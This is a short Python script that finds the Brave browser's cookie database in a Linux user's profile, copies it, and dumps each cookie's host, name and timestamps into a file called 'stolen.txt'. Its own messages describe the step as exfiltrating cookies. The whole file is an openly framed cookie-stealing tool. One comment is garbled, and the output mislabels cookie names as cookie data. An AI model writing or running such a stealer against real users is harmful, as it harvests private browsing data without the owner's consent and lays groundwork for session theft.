import os, sys, sqlite3, shutil

def find_db(_path):
    # walk through all directories and subdirectories
    for root, dirs, files in os.walk(_path):
        if 'Cookies' in files:
            # if found, return the full path
            return os.path.join(root, 'Cookies')
    
    # generic error if database not found
    raise FileNotFoundError("Cookies database not found")
    
def main():
    dump = []
    
    # confirm brave root directory exists
    try:
        cdir = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default")
    
        if not os.path.exists(cdir):
            sys.exit('\r\nBrave does not appear to be installed...\r\n')
    except Exception as ex:
        print(ex)
    
    # locate cookie database
    try:
        cookie_db = find_db(cdir)
    except FileNotFoundError as e:
        sys.exit('\r\nCookie database not found!..\r\n')
        
    # make a copy to avoid access errors    
    cd = os.getcwd()
    clone = os.path.join(cd, os.path.basename(cookie_db))
    try:
        shutil.copy(cookie_db, clone)
    except:
        sys.exit('\r\nError copying database!')
    
    # attempt to query cookie info
    print('\r\nThis may take a moment...\r\n')
    
    try:
        # connect to cookiesException as e.sqlite
        conn = sqlite3.connect(clone)
        cursor = conn.cursor()
    
        # query all urls
        cursor.execute("SELECT creation_utc, host_key, name, expires_utc FROM cookies;")
    
        # get results
        rows = cursor.fetchall()
    
        # close db
        conn.close()
    
        # verbose output
        for row in rows:
            input = f"Creation UTC: {row[0]} | Website: {row[1]} | Cookie data: {row[2]} | Expiry UTC: {row[3]}"
            
            # add to list
            dump.append(input)
    
    except sqlite3.Error as e:
        sys.exit(f"\r\nSQLite error: {e}")
        
    # delete cloned cookies.sqlite
    try:
        os.remove(clone)
    except:
        pass
    
    # dump to textfile
    try:
        with open("stolen.txt", "w") as file:
            for cookie in dump:
                file.write(cookie + "\n")
    except:
        sys.exit('\r\nError exfiltrating cookies!..\r\n')
        
    sys.exit('\r\nDone!\r\n')

if __name__ == '__main__':
    main()
